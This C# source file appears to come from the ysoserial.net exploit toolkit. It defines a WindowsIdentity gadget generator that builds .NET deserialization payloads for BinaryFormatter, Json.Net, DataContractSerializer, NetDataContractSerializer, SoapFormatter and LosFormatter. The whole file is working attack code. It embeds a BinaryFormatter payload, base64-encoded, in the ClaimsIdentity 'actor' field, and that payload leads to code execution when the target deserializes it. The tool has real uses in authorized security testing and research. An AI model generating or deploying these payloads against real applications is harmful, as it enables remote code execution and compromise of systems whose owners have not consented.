using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Security.Principal;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class WindowsIdentityGenerator : GenericGenerator
    {
        // Bridge from BinaryFormatter constructor/callback to BinaryFormatter
        // Usefule for Json.Net since it invokes ISerializable callbacks during deserialization

        // WindowsIdentity extends ClaimsIdentity
        // https://referencesource.microsoft.com/#mscorlib/system/security/claims/ClaimsIdentity.cs,60342e51e4acc828,references

        // System.Security.ClaimsIdentity.bootstrapContext is an SerializationInfo key (BootstrapContextKey)
        // added during serialization with binary formatter serialized Claims

        // protected ClaimsIdentity(SerializationInfo info, StreamingContext context)
        // private void Deserialize
        // using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(info.GetString(BootstrapContextKey))))
        //     m_bootstrapContext = bf.Deserialize(ms, null, false);
        //
        // Changed by Soroush Dalili: 
        // "actor" has the same effect as "bootstrapContext" but is shorter. 
        // Therefore, all ".bootstrapContext" has been replaced with ".actor" it has been replaced in this plugin

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
        }

        public override string Name()
        {
            return "WindowsIdentity";
        }

        public override string Finders()
        {
            return "Levi Broderick";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                var obj = new WindowsIdentityIdentityMarshal(b64encoded);
                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {
                string payload = @"{
                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                }";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                string payload = $@"<root type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <WindowsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"">
      <System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
       </WindowsIdentity>
</root>
";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                string payload = $@"<root>
<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""System.Security.Principal.WindowsIdentity"" z:Assembly=""mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <System.Security.ClaimsIdentity.actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</System.Security.ClaimsIdentity.actor>
</w>
</root>
";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
    <a1:WindowsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Security.Principal/mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
      <System.Security.ClaimsIdentity.actor xsi:type=""xsd:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
    </a1:WindowsIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "mscorlib" }, null, FormatterType.SoapFormatter);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    [Serializable]
    public class WindowsIdentityIdentityMarshal : ISerializable
    {
        public WindowsIdentityIdentityMarshal(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsIdentity));
            info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
        }
    }
}
